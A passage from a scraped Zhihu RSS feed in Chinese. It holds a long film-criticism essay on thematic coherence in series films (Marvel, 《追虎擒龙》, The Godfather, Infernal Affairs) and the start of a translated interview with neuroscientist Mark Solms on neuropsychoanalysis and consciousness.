更是会有贯穿一生创作的某种作者性，而构成了其人的“永恒主题”——母题。我们在描述电影艺术性之时，经常会用到“作者性”一词，即是创作者的自我表达——不是单纯地对剧本进行影像化，而是以剧本为蓝本表达自己的想法。</p>\n<p>而如果我们审视漫威的创作，会轻易地发现很多非电影化的电视剧式手法。他们将一部单片中的元素、人物的发展、甚至剧情本身，延续到下一部单片之中，并让它成为了一个常规操作。这样一来，本作的观众会被引导到下一部作品中而形成话题和票房的延续，又能够有远超一般电影的容量来展开巨型的世界观、来创造更多的商业价值和粉丝粘性。就像我们通常会叫的那样，“电影连续剧”。</p>\n<p>在有些作品中，这样的启后，会以片尾彩蛋的形式进行。这是一个好的手法，不动摇本篇的完整性。但在一些作品中，本篇的戏份资源也被用于启后，甚至连基本剧情在单片中的完整性都被打破、成了说书一般的“预知后事如何请听下回分解”（比如《复仇者联盟三》），对本篇的表达就不那么无碍了-----从基础叙事的角度来看，灭霸的战争这一单片中引出的核心事件，显然没有得到任何解决；而从主题表达的角度来看，承载表述核心任务的钢铁侠为代表，所有角色都半途中断，直到后续的第四部才得到了收束，例如钢铁侠身上的“人类之身，比肩神明”，第三部是引子，让他看到了灭霸的强大并感受到自身保护他人的无力，而后的第四部才完成了打响指的“牺牲自我代价下的比肩神明，保护大家”。</p>\n<p>另外，在电影拍摄中，漫威会根据粉丝的喜好，创造一些“爆点”元素并反复深化——比如雷神和洛基的基情，电影中的冷幽默小段子。同样地，有些作品中它们的程度适量，这就很ok；有些作品中它们反而喧了宾夺了主（比如《雷神三》），单片的主题表达的系统甚至剧情自身的节奏都被切碎，就很不ok了。它只关乎于讨观众的欢喜，却与主题表达基本构不成联系。对于“一切元素服务于主题表达系统”的理念，这无疑是一种逆反。</p>\n<p>在很多时候，对于自己重视、在宇宙中分量较重的作品，漫威会精心管理，拍出表达完成度不错的作品。《钢铁侠》系列，《复仇者联盟一、二》《雷神一》，包括后续的《蜘蛛侠》系列，都是如此。但当他们面对一些别的系列时，似乎就不那么上心，对主题也不太在意，而是更多地进行爆点元素的堆积来投观众所好、并大量地“启后”了。而我们也会发现，劣化作品出现的曲线，与系列的发展延长构成直接同步，这也说明了漫威在面对系列愈发扩容后的难以应对，也正是系列电影“越长越难拍”的本质体现，</p>\n<p>实际上，就像前文所述，对于系列电影，一个很标准的操作方式是：单片有单片在某一阶段和层级上的主题，并在单片中构成完整的表达；而作为系列，又有不同阶段和层级的主题组合起来的、形成一体化后的大主题。由于创作能力和体量积累的主客观原因，漫威无法完成这个任务，但他们也绝非孤例。在近期上映了“实质上的《追龙》第三部”《追虎擒龙》中，我们就可以看到王晶在延续系列质量上的后继乏力。</p>\n<p>《追虎擒龙》，是一部产生自标准模式下的无功无过之作品，延续了《追龙》第一部中的故事，体现了第一部里跛豪与徐乐的结局，也在基础的叙事环节上构成了对第一部的对应。《追龙》里，跛豪和徐乐身处于完全无秩序的混乱香港，各帮派毫无约束、自由厮杀，而警察机构内也各自为政、缺乏统领。在黑道与官方的双重混乱之下，平民百姓的生活完全没有任何的稳定可言。而跛豪和徐乐，基于同一理想，带来了一种基于暴力的相对秩序化机制---建立警队内部的“贪污秩序化”和黑道系统的“分赃秩序化”，从而保证了香港社会的相对稳定运转状态，平民依旧要面临压制和剥夺，但却“有法可循”，暴力事件对社会秩序的破坏也变少了。这是跛豪和徐乐的理想，但终究不是最完美的状态，暴力之基础必然带来难以长久持续的缺陷，而《追虎擒龙》，便是对缺陷的揭露、最完美状态的呈现-----徐乐和跛豪价值观的变质，暴力秩序体系运转上的变质，最终被更理想形态的取代。</p>\n<p>然而，从成片质量上看，《追虎擒龙》却没有拍出足够独立的主题表达性，而是在很大程度上依托于《追龙一》，而在单片内部的独立表达层面上，更准确的形容或许是：有所努力，一定效果，远远不够。</p>\n<p>首先，为了方便“警察抓贼”这样一个基础剧情的展开，王晶便将更多的正面描写内容放在了廉政公署的古天乐和林家栋一边。而作为一种标配，这条线索上有着人物成长的元素：警察要经历打击，才能从绝对的理想主义者变成深明现实的现实主义者，才能从纯真走向成熟，在残酷的世界中真正获胜，而不是壮志未酬。电影里。古天乐经历的第一次洗礼，是自以为正义的仗义执言后的被打，这让他意识到，言语道理的胜利并不能驳倒恶人，而是会被恶人以力量压制，“以论理获胜”的“不脏手”式纯粹正义，并不能贯彻在现实结果中。这个变化，具象成为了他从打着哆嗦被打到干练探员的变化。第二次洗礼，则是林家栋的死。这让他直面代价的残酷，意识到自己需要面对什么风险。</p>\n<p>而这两次洗礼，造就了一个不那么绝对正义的古天乐——给郑则仕的打火机安装窃听器，并将录音交到梁家辉手里，分化了他们的兄弟情，且在郑则仕的悲痛欲绝面前默不作声、掩盖真相，避免郑则仕对自己的逆反心理，无法获取证词。这种对于郑则仕的欺骗和利用，与电影开始时的古天乐形成了对比，淡化了他的“绝对正义”，让他从理想主义者变为现实主义者，从纯粹追求变为结果追求，也在一定程度上辅助了作品“何谓正邪”主题的表达。</p>\n<p>而从“徐乐”吴镇宇和“跛豪”梁家辉的角度，王晶当然也没有将他们置于纯粹的恶，而是展现出了两面性。电影里大篇幅地“展现”了反派集团的情义：梁家辉与吴镇宇的同袍，吴镇宇与郑则仕的亲情，甚至梁家辉与打手部下的情义。而在后半段，电影也展现了他们情义的分化变质：吴镇宇与梁家辉的分裂，郑则仕对吴镇宇的背叛。然而，这一切又带着很大程度上的无奈：吴镇宇和梁家辉的分裂，来自于找人接班梁家辉生意的需要，“阿豪要退休的”；郑则仕对吴镇宇的背叛，则来自于对吴镇宇“暴力解决”之手段的恐惧，担心吴镇宇处理掉手下平息危机后的下一目标便是自己。</p>\n<p>事实上，这种无奈之下的情义变质，构成了对电影主题的深层引导。郑则仕和吴镇宇在最后的会面种，说出了他们发自《追龙》第一部中的理想与实现：吴镇宇划分势力规则后，香港拥有了相对秩序，这也构成了他们选择走入犯罪道路的一个推动契机。然而，就像电影里的种种背叛发生时的起因所体现的那样，吴镇宇背叛梁家辉的“生意”考虑、郑则仕背叛吴镇宇的“保命”考虑，都是基于利益与暴力之相对秩序化的局限性表现。郑则仕说的“你变了”，则是走入这种负面变化之被动、被迫性的体现。他们的本性并非纯恶，而是《追龙一》里刻画的那样。但是，为了自己的目标理想的实现，他们建立起的相对秩序，最终也会因为缺陷而变质，并随之带来他们自身的变质。这一层内容的反面体现，则是阿七的恶人变好人。在电影里，也用了友情的对比来凸显这一点：正派之间的延续情义，反派的无奈分裂。</p>\n<p>古天乐的非绝对正义，吴镇宇的美好本心，对应了“何为善恶”的终极主题。古天乐的理想化与吴镇宇的理想化是二者的初心，也引导出了后续的各自行为。然而，在实现目标的过程中，成功的古天乐必须抛弃绝对正义，失败的吴镇宇则并不绝对邪恶、只是无形中变质。吴镇宇在阶段性成功后的变质，也正是古天乐“染上黑色”后长久性成功的反面。他的香港，在某种意义上成为了古天乐之香港的“垫脚台阶”。而无论是四大探长时代的香港，还是后四大探长时代的香港，都不是理想主义的纯粹实现，而沾染了很多的现实化色彩。理想主义的纯粹善恶两极化，是不存在于现实世界的。</p>\n<p>对于《追龙》系列，王晶投入了以个人而言极其罕见的认真程度，《追虎擒龙》里也可以看到他对于主题呈现的很多努力痕迹。然而，即使如此，电影的整体质量依然难言优秀。在单片的有限空间内，王晶既要沿袭第一部中关于跛豪和徐乐的表述，又要开发廉政公署的表述，还要让双方--特别是跛豪和徐乐---具有正反两面性，从而将第一部与第三部串联而成完整一体的系统。他的能力，显然无法实现之。</p>\n<p>于是，在成片里，我们便更多地看到了“概念化与套路化的点到即止”。古天乐的变，由简短的怕开枪到会开枪，粗糙地达成。而吴镇宇对香港的所谓贡献，则只体现在了台词上。吴镇宇与梁家辉、郑则仕之间的原有关系，没有借助闪回，而是权当观众看过《追龙一》，用一些台词一带而过。并且，最致命的一点是：以王晶的表达系统而言，主题讨论终究要落在反派这边，这也是讲第三部中的“变质”与第一部中的“情义”连接起来、构成对理想主义灭亡、模糊善恶的关键。</p>\n<p>然而，由于上述的“惯性模式思维”，王晶将影片主视角设立在了“抓贼方”身上，而又不可避免地对吴镇宇一方做更深层的表现。于是，古天乐一方与主题的连接性变弱了，除了古天乐最终“黑化”的“利用郑则仕”一部分之外，在更多的时间里，只负责正义、受挫、抓人。而另一边，由于主视角的设定，吴镇宇这边成为了廉政公署的对比，在行为上更多负责邪恶、暴力、杀人。</p>\n<p>这样一来，一切都变得不明晰了：开头时市民无视犯罪到结尾纷纷举报的“香港转变”正义感之由来无法落地；吴镇宇嘴里“香港比原来安稳多了”强权暴力下的相对秩序也无缘得见。剩下的，只有吴镇宇组织内部亲情变质对主题的侧面引导环节。主题变得不明确了，失去了“民众在前徐乐时代的苦痛后对徐乐时代的相对向心力，以及在徐乐末期变质下的再次不满、转而支持警察、向警察提供线索并回忆过往秩序”走向下，双线并列与主题表现的可能性——民众转变的对比服务于探案的警察主线，也表现了过往的徐乐，与现在的徐乐构成对比，托起徐乐最后关于暴力对秩序维护的台词。</p>\n<p>应该说，王晶的模式化思维，让电影的剧情展开变得更容易，让观众更容易进入作品，但也势必造成主题表现的巨大阻碍----第一部铺垫良好、表现力更吃重的吴镇宇一方缺少“变质前”的展现，而主视角下的廉政公署一方，由于缺少第一部的铺垫，也只是勉为其难地给出了一些辅助性的表达作用，且林家栋的人物形象都趋于了单薄。结果便是，对第一部的衔接也没有做好，第三部独立的主题表达也缺少了来自吴镇宇一方的关键证明。</p>\n<p>而有趣的是，延续系列主题、但剧情上不相关的精神式续作《追龙二》，反倒在独立性上有了更好的相对表现。在这部电影里，王晶依旧试图延续上一部中人物形象和主题倾向上的成功----在人物上，他设立了一个与上一代的“跛豪”非常相似的枭雄式人物；而在主题上，他也与上一部一样，试图去表现一种“在现实面前的奋斗初心与理想不再”之感，从而营造出枭雄的悲剧式结局。</p>\n<p>在电影的开头，王晶在表现梁家辉的第一次出场时，使用了过山车这个道具----梁家辉身处过山车之上的极致逾越，暗示着他一种身处于“远离地面的天国之上”的生活状态。而随后，在进一步交代梁家辉的生活环境时，王晶则用了多个交代梁家辉家族和乐而又经济富足的镜头，具体地描绘了梁家辉的“天国”-----与兄弟们亲如家人，而又共享财富。这种生活状态和家族构成，无疑是香港电影中比较常见的理想化、英杰化的枭雄形象。并且，在电影的发展部分，王晶也频繁地去具体表现梁家辉对于集团中兄弟们的和谐互动----一起吃饭、为兄弟们买糕点吃，等等。最后，到了结尾，梁家辉临刑之前，望向天空（理想化天国的所在），回想起了与兄弟们亲如一家时的画面，以及此时闪回的“跳楼机上的梁家辉举起双手，享受着身处半空（天国）的状态”影像，都进一步地加强了对梁家辉之理想的表现----他想要的，是一个兄弟如亲人，共享荣华的大家庭乌托邦。但是，在电影中，梁家辉的理想最终破灭了----兄弟林家栋背叛了自己，古天乐为首的警察一方打进了家族，自己最终兄弟离散、身死人手。</p>\n<p>当然，《追龙二》在细节上缺乏打磨，造成了很多的粗糙段落，在逻辑上并不严谨，难成佳作。但是，在主题表达效果上，它显然比《追虎擒龙》更加独立而完整。这与它“世界观封闭，不需要与前作做具体对接”的优势是分不开的。第三部与第二部在主题呈现的质量差距，也再次说明了高度密切相关之系列电影的创作难度。</p>\n<p>当然，即使难度颇高，我们依然能在一些水平更高的创作者的系列电影中，看到成功的案例。</p>\n<p>抨击漫威的科波拉本人拍摄的《教父》系列，围绕着“美国梦的破灭”所进行的创作，就是相当完美的正向范本。第一部中，迈克从逆反家族生意，到父兄重创而被迫成为教父并性格转变——在美国，意大利人的共同宿命即是堕入黑暗。到了第二部，迈克想要照顾哥哥，但最终被迫杀死哥哥——在美国，意大利人最终都将被迫割去自己的全部人性，教父其职，也宿命地必将从维多的人性走向迈克的剥离人性。第三部中，迈克想要带领家族走上正路，但女儿被杀死——意大利人永远无法逃脱黑暗的宿命，在美国走进光明，他们的结局只有毁灭。</p>\n<p>在叙事系统上，科波拉不仅给出了单片的独立完整性，更让各部之间产生了相互的作用。在这一部中，迈克承载了父辈“洗白家族，合法立身于美国上流社会”的梦想，是柯里昂家族美国梦的寄托，但家族在美国的地位，全部依赖于暴力与犯罪，这让迈克终究无法脱身自保。美国梦的幻灭，在这一部中已经彰显无遗。到了第二部，科波拉采取双线并行的结构。维多的青年时期回溯了他“保护家庭”的初心，为第一部中他赋予迈克的希望进行了强化，将之延续给了迈克。而承载第一部中维多希望的迈克，则在第二部的现实时期里戳破了这种“第一部中继承自维多”的希望。并列的两个时期里，维多逐步建立和保护家庭，迈克逐步在试图以暴力手段的维系中反而破坏家庭，在全片的行进中始终保持着同一节奏。借助“维多建立与迈克破坏的同调”，科波拉用强烈的对比手法，表现出科里昂家族“维护家庭，立身美国”之本愿的必然性破灭。第三部，则是对第一部的高度对应。在剧情上，迈克试图让大家族的生意走上白道，来挽回自己失去的小家庭，这与第一部中维多对他的期待正好对应。但最终，家族洗白失败，迈克女儿被杀，也与第一部中“迈克最终堕入黑暗”的结局实现了对应——科里昂家族的维系和生存终究离不开暴力，家族领袖试图放弃暴力、挽回家庭的努力也不会成功，无论是什么年代，无论是维多还是迈克，美国梦都终将破灭，而第一部的“步入黑暗”的结局，更成为了后续逐渐完全落入深渊的绝望开端。</p>\n<p>而在剧情之外，于电影化表达系统的元素运用上，科波拉也设计了很多巧妙的对应部分，让第一部与第三部实现了联动对比。例如，第一部中，迈克作为维多的接班人，被迫地参与了谋杀敌对家族首领的行动，而在他过手的主要暗杀段落中，杀害过程都以固定镜头之下的中远景呈现，淡化了被害人与杀害人的极端化情绪，而显出了一种高度的冷静、克制、目的性。这一点，其实也体现在了第二部的多次暗杀段落中。而第三部中，文森特作为迈克的接班人，则更加主动地建议、推动了暗杀敌人的行动，且在他亲自骑马执行暗杀的段落，科波拉改用特写与手持摄影，强化了文森特的快意与被害人的痛苦。这样的高度对应，揭示了柯里昂家族的更深一层堕落----暴力，已经从曾经的无奈、自保，变成了执行者的享受与自得，距离维多的初衷愈发遥远。并且，在两部的高潮段落，同样是“歌剧与暗杀”的组合，第一部中歌剧、基督教洗礼、暗杀的反复切换，展现出迈克“看似投身信仰，实则献身魔鬼”的深度黑化，而第三部中歌剧与女儿死亡的结合，则与第一部对应起来，揭示了“为了立足美国而献身魔鬼”后的必然悲剧结局。</p>\n<p>而非常值得注意的是，三部电影的结局，恰好串出了科波拉想要表达的全部主题推导过程。</p>\n<p>第一部中凯从门外望向打理公务的迈克，而后房门关闭。这与第一部的开头构成了高度的对应----同样从教父办公室门外拍摄的两代柯里昂工作的画面，暗示着迈克已经走上了父辈一样的人生，而在凯面前关闭的大门、随后落入的一片漆黑，标志着迈克与他“保护家庭”之初心的首次分离，堕入黑暗邪恶的开启。第二部，迈克处决了弗雷多----那个他在整个电影中一直试图保护与原谅，但最终因为教父身份所造成的权力高下产生了兄长的愤怒与逆反，从而挽救失败。在这一部的结尾，迈克孤独地坐在毫无光亮的房间中，周身被黑暗笼罩。在与又一个亲密家庭成员的决裂之中，他仿佛完全堕入了黑色的国度，成为了地狱的国王，与他保护家庭的光明初心渐行渐远。而在第三部中，迈克死在花园中，这一幕与第一部中维多的死亡场景高度相似而产生对比：维多死在儿孙环绕中，而迈克身边只有一条狗。这个对比强化了迈克“维护家人”初心的完全落空，也彻底地表达了主题：意裔美国人在美国的无法走上正途，而只能以暴力和黑道生计来维持，并最终落入必然的家庭破灭的悲剧。</p>\n<p>特别是在第三部的结尾，科波拉通过与第一部的高度对应，实现了最终的“美国梦之破灭”的幻灭感传达，于腔调和表意上几乎无懈可击。迈克濒死之时，“第一部中与凯的共舞”与“第三部中与女儿的共舞”的两个闪回构成了对应，精确地让主题达到了高潮----迈克最初对脱离家族的梦想，为了保护家庭而被迫身入罪恶行业后对凯保证“什么都不会改变”的初心，都已经在一环接一环的不得已之中，走向了最终的毁灭，走向了甚至连女儿都要失去的、彻底分崩离析的家庭。第三部结尾提供了一种极其出色的虚无与感伤，有力地对应了迈克于弥留之际对自己一生的体验感受。这样的腔调与高级感，其实并不只于第三部的结尾之中。这也正是科波拉的水准展示：他不仅在逻辑上衔接起了系列的收尾两部，更让这种衔接对应具备了直接作用于观者情感的灵性与氛围。</p>\n<p>或许，这就是《教父》作为系列电影而伟大的原因。叙事、电影语言双系统中的独立完整度与整体完整度，以及衔接单片中的腔调、意境，实现了三部曲形式的独立闭环与紧密衔接、第一部与第三部“大首尾对仗”下的结构之美。</p>\n<p>此外，《无间道》系列，同样是一个积极的正面范本。刘伟强对“无间地狱”宿命论的主题进行了三个阶段的阐述。第一部中，陈永仁和刘建明的宿命，是他们始终无法成为自己想要成为之人的宿命。第二部里，宿命则产生了两个方面：陈永仁想要当警察但情感受到倪家血脉的牵绊，刘建明想要成为保护mary的男人但最终杀死了她，二人的宿命依然延续了第一部；而另一方面，刘伟强又拍出了“黑帮终究逃不出堕落而血腥的命运”的宿命论——开头与黄sir交好而“看你本性不坏”的韩琛最终还是成为了尖沙咀头号黑帮，想要离开黑帮世界的倪永孝也逃不出属于黑帮的杀戮结局。这两部，构建了两重宿命的无间地狱。</p>\n<p>而最后的第三部，刘伟强则将“终极无间”集中到了刘建明身上：陈永仁和罗鸡死后做回了警察，一度黑白不明的黎明和陈道明也做回了警察，只有刘建明依然无法成为自己想要的样子，而又无法接受作为黑帮的自我，在身份认同的混乱中精神失常———最后一幕中，mary向他开枪，对身为杀人犯和黑帮的刘建明复仇，而刘建明自己却还在发送着摩斯电码，沉浸在对于陈永仁的身份替换幻想中。可以说，第三部中，第一部和第二部的主题被整合了起来——虽然其他人都处于各自的宿命地狱中，但终归是“做自己”，即使是死去的黎明和倪永孝，也是以警察和黑帮的本我身份死去，他们不存在自我认知的混乱——这样的终极悲剧宿命、终极无间地狱之中，只有刘建明。</p>\n<p>系列电影的创作，是一个门槛难度与质量收获成正比的模式。它对创作者的能力有着极高的要求，一旦无法支撑便是泄洪一般的巨大失败。但如果能力足够，那么它提供的更大体量与空间，将赋予有天赋的创作者以更多的发挥可能性，尽情挥洒才能与灵感，实现单片作品无法承载的表意系统与表意效果。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/segelas?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">segelas</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/67248746/answer/1967140375?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">15 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/286514993?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">能与黑客帝国、指环王、蝙蝠侠(诺兰版)比肩的电影还有吗？</a><br><a href=\"http://www.zhihu.com/question/341859673?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《黑客帝国》要拍第四部电影？</a><br>\n","link":"http://www.zhihu.com/question/67248746/answer/1967140375?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"让神经科学回归弗洛伊德，意识不过一种感觉？","date":"2021-06-28 08:30:10","description":"\n<p></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-805182d32ee077f4be4e8a763b2dcbe8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1920\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-805182d32ee077f4be4e8a763b2dcbe8_r.jpg\"></figure><p>在<b>马克·索尔姆斯</b>（Mark Solms）还是个孩子的时候，他就痴迷于宏大的存在主义问题：我们死后会发生什么？是什么造就了如今的我们？后来，他开始学习神经科学，却很快发现神经心理学对关于心灵的这些开放式问题没什么耐心。作为一位新晋科学家，索尔姆斯做了件闻所未闻的事情，<b>他把弗洛伊德认作神经科学之父，并开创了一个新领域——神经精神分析学</b>。</p>\n<p>索尔姆斯在人生道路上还遇到过另一个障碍。他出生于纳米比亚，在南非的种族隔离制度下长大。后来，索尔姆斯于一家医院工作，该医院位于索韦托，那里的军事占领者试图镇压抗议者。“一完成学业，我们就得被迫入伍，伤害那些曾经照顾过的人。”他说道。“这种事，我在情感上没法承受。”于是，他逃往英国，在那里接受了精神分析培训。种族隔离制度废除后，他才回到南非。</p>\n<h2><b>影响深远的童年创伤</b></h2>\n<p>索尔姆斯花了几十年的时间，致力于协调脑科学和生活经验研究。如今，他在新书<b>《隐蔽源泉》</b>（<i>The Hidden Spring</i>）里提出了自己的意识理论。索尔姆斯认为，神经心理学一直在错误的地方寻找意识。“智力诞生于大脑皮层，所以几乎每个人都认为意识也源自那里。”索尔姆斯写道，“我不同意。意识远比这更原始。它<b>诞生于人类和鱼类共有的那部分大脑。</b>这就是书名中的‘隐蔽源泉’。”这本书是对现代神经科学的一次深入探讨，对我们如何<b>思考、做梦、记忆和感知</b>做了惊人解释。</p>\n<p>我联系到了索尔姆斯，新冠疫情封锁期间他一直待在南非开普敦。我们讨论了脑——心智问题、神经心理学的偏见，以及家庭创伤如何塑造了他的人生历程。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a22d89f25d29213ad896c94126734f74_b.jpg\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"500\" class=\"origin_image zh-lightbox-thumb\" width=\"733\" data-original=\"https://pic1.zhimg.com/v2-a22d89f25d29213ad896c94126734f74_r.jpg\"><figcaption>我是谁？：“所有这些复杂的东西是如何将我的生活与这个身体器官联系起来的？”马克·索尔姆斯问道。他花了毕生时间研究大脑和意识，无惧违抗学术界传统，提出最根本的存在主义问题。—Ilhaam Abraham</figcaption></figure><blockquote><b>你写过你童年中的一个重要时刻——你哥哥遭受了严重脑损伤。你能描述一下发生了什么吗？</b></blockquote>\n<p><b>索尔姆斯：</b>那时我四岁，他六岁。我父母在划游艇，我在水边，但他和一些朋友爬上了俱乐部屋顶。然后，他被绊倒，从三层楼跌落到下面的人行道上，头骨骨折。<b>在撞击过程中，他失去了意识并且经历了持续性脑出血。</b>当时我们住在一个小村庄，所以我们必须将他空运到开普敦的一家医院。好在他在事故中幸存了下来。让我感到不安和极度难以理解的是，<b>他虽然看起来跟以前一样，但又完全变了。</b>他失去了他的发展里程碑，比如，变得大小便失禁；他的人格也不同了，变得更加情绪化、易怒和难缠；他的智力水平也变了。</p>\n<blockquote><b>你说这对你产生了深远影响？</b></blockquote>\n<p><b>索尔姆斯：</b>的确如此。这场意外让我开始思考，大脑怎么可能只是他脑袋里坏掉的那个东西？为什么他会变成这副熟悉而又陌生的样子？他去哪了？这个人，我的哥哥，怎么会是一个器官呢？我迅速地推及自己，然后想，“嗯，我是我的大脑吗？这怎么可能呢？<b>如果我的大脑受损，我会变成另一个人吗？原来的那个我会去哪呢？</b>”而这件事对于我父母来说是一场悲剧。他们为此感到极度内疚。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-53ea51b35316800a20f04335d673b6e4_b.jpg\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"1335\" class=\"origin_image zh-lightbox-thumb\" width=\"1024\" data-original=\"https://pic1.zhimg.com/v2-53ea51b35316800a20f04335d673b6e4_r.jpg\"><figcaption>如果大脑受损了，我会变成另一个人吗？原来的我又会去哪里？—www.ooopic.com</figcaption></figure><blockquote><b>所以当你还是个小男孩的时候，就在问一些当今神经科学所涉及的深奥问题了。什么是自我？大脑如何与我们的精神体验联系起来？</b></blockquote>\n<p><b>索尔姆斯：</b>我觉得，我只是因为那件事过早地陷入这些思虑。对我来说，这些问题也与死亡有关。如果我的肉体死了，我就会消失，这太可怕了。我还想到，如果我们会永远消失，那做事情还有什么意义呢？这些想法让我非常不安，将我推入一种只能被称为“抑郁”的漩涡里去。我还记得那些早晨的感觉，“上学有什么意义呢？”以至于我都没有力气去系上鞋带。显然，我不相信在四五岁时我就决定了成为一名神经科学家，但如今回想起来，这两件事必然有关联。<b>成为神经科学家，大概算是解决那种虚无主义绝望的一种方法。</b>印象中，我十几岁的时候就想过，唯一真正值得做的事情是努力去理解存在是什么，感受性（sentience）又是什么？</p>\n<h2><b>“神经精神分析”的诞生</b></h2>\n<blockquote><b>你继续研究神经科学，尤其是梦的科学。这对你思考意识的本质有什么影响？</b></blockquote>\n<p><b>索尔姆斯：</b>神经科学里最让我感兴趣的是<b>心灵与大脑如何关联</b>，所以神经心理学是神经科学中最吸引我的领域。但当我来到大学，我学到的是些<b>抽象功能——记忆、语言、知觉和执行控制的信息处理机制</b>。人们对心灵的实际主观存在没有兴趣。当我问起关于“记忆的内容”和“人的生活的内在驱动力”的问题时，我的教授们严肃地劝告我：不要问这样的问题，这对你的职业生涯不利。</p>\n<blockquote><b>你有一个重大发现，推翻了我们只在快速眼动（REM）睡眠期间做梦的主流理论。你发现了什么？</b></blockquote>\n<p><b>索尔姆斯：</b>主流理论只是假设：<b>当快速眼动睡眠停止时，我们的梦也会停止。</b>但我发现，大脑中负责引起REM的部位受损的病人仍然会继续做梦。回顾过去，我们会发现自己犯了重大的方法论错误，<b>这种错误就是不收集主观数据所付出的代价。</b>要知道，对科学来说，处理梦的实际主观体验是件尴尬的事，这就是我的教授们说“不要研究那些东西”的原因。但如果我们遗漏掉一半的可用数据，就会错失一些关于大脑如何运作的重要信息。</p>\n<blockquote><b>作为一名神经科学家，你对弗洛伊德的兴趣非同寻常。你实际上受训成为一名精神分析师，之后还编辑了弗洛伊德的著作全集。</b></blockquote>\n<p><b>索尔姆斯：</b>对，我的同事们都吓坏了，他们告诉我这是伪科学。其中有一个对我说：“你知道吗，天文学家不研究占星术。”的确，精神分析已经失去了它的根基。弗洛伊德是一位训练有素的神经科学家和神经病学家，但在后来的几代研究者中，<b>精神分析丧失了生物科学根基，</b>所以我能够理解一些人对精神分析的不屑。但值得称道的是，它研究的是真正的心灵体验，而这正是我感兴趣的东西，也是神经心理学缺失的东西。于是我转向精神分析，<b>尝试系统性地研究主观经验，并推断其背后的机制。</b></p>\n<blockquote><b>我们误解了弗洛伊德吗？他是否有被我们忽视的科学洞见？</b></blockquote>\n<p><b>索尔姆斯：</b>很有可能。我不会假装弗洛伊德没有犯过一些重大错误，这是意料之中的事。他是一位先驱，迈出了系统性研究主观经验的第一步。他之所以没有在神经科学上取得大的进步，并放弃了这一领域，是因为当时还没有科学的方法来研究事物。即使是<b>脑电图</b>，也是在第二次世界大战后才被广泛应用的。所以，当时没有研究活体大脑活动的方法，更不用说我们现在拥有的方法了。但他基本的观察总结，是占据中心地位的情绪——情感感受对认知过程的影响很大。<b>这就是精神分析的本质所在，即我们的理性、逻辑和认知过程如何被情绪力量所扭曲。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-83b46ad6f51b9760f66db0ae47a2b311_b.jpg\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic2.zhimg.com/v2-83b46ad6f51b9760f66db0ae47a2b311_r.jpg\"><figcaption>我同事对我研究弗洛伊德感到惊恐。他们告诉我这是伪科学。</figcaption></figure><blockquote><b>你开创了“神经精神分析”这个新领域。这种方法的基本前提是什么？</b></blockquote>\n<p><b>索尔姆斯：</b>我所学的神经心理学也可以说是神经行为主义。<b>奥利弗·萨克斯</b>（Oliver Sacks）在1984年的著作中指出，神经心理学是令人钦佩的，但它排除了心灵，即活跃的心灵主体。这确实引起了我的注意，所以我想要把心灵重新带回神经心理学。在上世纪80年代的神经心理学中，情绪尚未被研究。而<b>情绪在心灵体验中的中心地位，以及隐藏在情绪背后的东西，就是弗洛伊德所谓的“驱力”。</b>简单来说，他的观点是，不愉快的感觉代表了未被满足的需求，相反，愉快的感觉则代表满足了的需求。这就是了解“我们如何满足自己最深层生物需求”的方式。这种观点为认知提供了一种基础，而我认为这种纯粹又简单的基础在认知科学中是非常缺乏的。</p>\n<h2><b>意识是一种感觉</b></h2>\n<blockquote><b>意识科学领域存在着巨大争论。解释大脑和心灵之间的因果关系是科学界最困难的问题之一：大脑由神经元和突触连接组成，而心灵涉及思考和感觉的非物质世界，它们似乎存在于两个完全独立的领域。你怎么理解这个问题？</b></blockquote>\n<p><b>索尔姆斯：主观经验，即意识，当然是自然的一部分，因为我们是具身的生物，是经验的主体。</b>所以，我们可以从两方面来看待你刚才提到的那个大问题。我们可以说，想象物理器官如何成为经验主体是极端困难的，所以它们必然属于两个不同的宇宙，因此主观经验是不可理解的，它在科学范围之外。但我很难接受这样的观点。我赞成的一种观点是，一定可以通过某种方式弥合这种分歧。</p>\n<blockquote><b>其中争论的主要焦点是意识是否能够还原为物理或生物学规律。哲学家大卫·查尔莫斯曾推测，意识是自然界的基本属性，无法被还原为任何自然规律。</b></blockquote>\n<p><b>索尔姆斯：</b>我接受这个观点，除了“基本”这个词。我认为，<b>意识是自然界的一种属性，但不是一种基本属性。</b>这很容易解释。很久以前发生过一次宇宙大爆炸，过了很久之后，生命第一次出现。如果查尔莫斯认为意识是宇宙的基本属性，那么意识一定早在生命诞生之前就存在了。我知道有些人相信这一点。但作为一名科学家，当我们看到这些证据的分量时，“甚至在宇宙大爆炸之时，就已经有了意识的某种基本形式”的说法，就不那么可信了。“基本属性”这个说法，基本上等同于上帝，所以它并没有真正解决这个问题。</p>\n<blockquote><b>你当然可以发现大脑功能和精神活动之间的各种关联。我们知道大脑损伤——比如发生在你哥哥身上的事情——可以改变一个人的性格。但这仍然无法解释因果关系。就像哲学家约翰